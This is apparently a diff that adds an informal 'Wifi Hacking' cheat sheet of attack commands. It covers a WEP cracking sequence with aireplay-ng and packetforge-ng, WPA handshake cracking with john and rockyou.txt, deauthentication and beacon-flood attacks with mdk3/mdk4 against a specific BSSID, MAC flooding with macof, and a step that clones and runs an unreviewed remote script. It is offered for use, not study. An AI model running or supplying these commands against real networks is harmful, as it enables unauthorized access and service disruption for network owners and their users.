@@ -1,0 +1,136 @@
+Wifi Hacking :-
+
+
+Use a wifi adapter to get Ensure u have a wide range and to preform packet injection fast
+
+Step 1:- 
+Is to Monitor on Going trafffic so we need to put our wifi adapter to Monitoring mode
+
+* If u dont have a driver for kali so :-
+----------------------------------------------------------------------------------------------------------------------------------------------------
+| git clone https://github.com/Esther7171/kali-wifi-driver-and-wifi-hacking && cd kali-wifi-driver-and-wifi-hacking && chmod +x hii.sh && ./hii.sh |
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+___________________________________________
+
+CHECKING NETWORK ADAPTERS INTERFACE
+#airmon-ng
+
+ENABLING MONITOR MODE
+#airmon-ng start wlan0 
+(where wlan0 is your network cards interface)
+
+STARTING DUMP OF NETWORKS-SCANNING NETWORKS
+#airodump-ng mon0
+(where mon0 is wlan0 when place into monitor mode)
+
+STARTING DUMP OF SPECIFIED NETWORK AND MAKING A CAPTURE FILE
+#airodump-ng --bssid 00:00:00:00:00:00 --channel 1 -w target mon0
+(where 00:00:00:00:00:00 is the bssid of target network, where 1 is target networks channel, where -w means write, where target is the name of the capture file you are writing)
+
+Authentication request
+#aireplay-ng -1 0 -a (BSSID) mon0
+(DELETE quotes and enter targets bssid)
+
+Produces fragment file
+#aireplay-ng -5 -b (BSSID) mon0
+(DELETE quotes and enter targets bssid)
+
+Creates packetforge for aireplay
+#packetforge-ng -0 -a (BSSID) -h 00:11:22:33:44:55 -l 255.255.255.255 -k 255.255.255.255 -y (fragment file from command above) -w arpy
+(DELETE quotes and enter targets bssid, as with the quotes and insert the fragment file)
+
+#aireplay-ng -3 -r arpy -b (BSSID) mon0
+(DELETE quotes and enter targets bssid)
+
+#aircrack-ng target-01.cap
+(where target is the name of capture file)
+
+
+___________________________________________
+
+
+
+
+
+
+
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0
+
+
+aireplay-ng --fakeauth 0 -a <target-mac> -h <kali mac> wlan0
+
+aireplay-ng --arpreplay -b router -h fake auth mac wlan0
+
+to send data
+aireplay-ng --arpreplay -a <attack> -h <fake auth device mac> wlan0
+
+airodump-ng wlan0 --band abg
+
+a=5ghz
+bg=2.4gz
+
+aircrack-ng handshake.cap -J meow
+hccap file crack by jhon
+
+hccap2john meow.hccap > new
+jhon new -w rockyou.txt
+
+---------------------
+packet injection
+sudo airmon-ng start
+sudo aireplay-ng --test wlan0
+
+AP test
+iw list | grep AP$
+
+
+
+
+
+
+**********************************
+# Turn Down your interface
+
+sudo ifconfig wlxlcbfce down
+# change name 
+
+sudo ip link set wlxlcbfce name wlan0
+
+# sudo ifconfig wlan0 up
+
+
+
+
++++++++++++++++++++++++++++++++++++++++
+creat list of file of different name
+mon enable
+
+mdk3 wlan0 b -c 1 -f /home/$USER/Desktop/
+
+fake wifi make
+
+mdk4 wlan0 b -f /home/death/Desktop/wifi-fake
+
+direct without file
+mdk4 wlan0 b
+
+particular bssid 
+mdk4 wlan0 b -n (bssid)
+
+deauth
+mdk4 wlan0 d -B 64:FB:92:8C:14:78 -c 1 -s 50 (speed)
+
+deauth all clint 
+mdk4 wlan0 a 
+ 
+
+fake arp table attack
+mdk4 wlan0 a -a 64:FB:92:8C:14:78
+
+
+
+macof -1 eth0
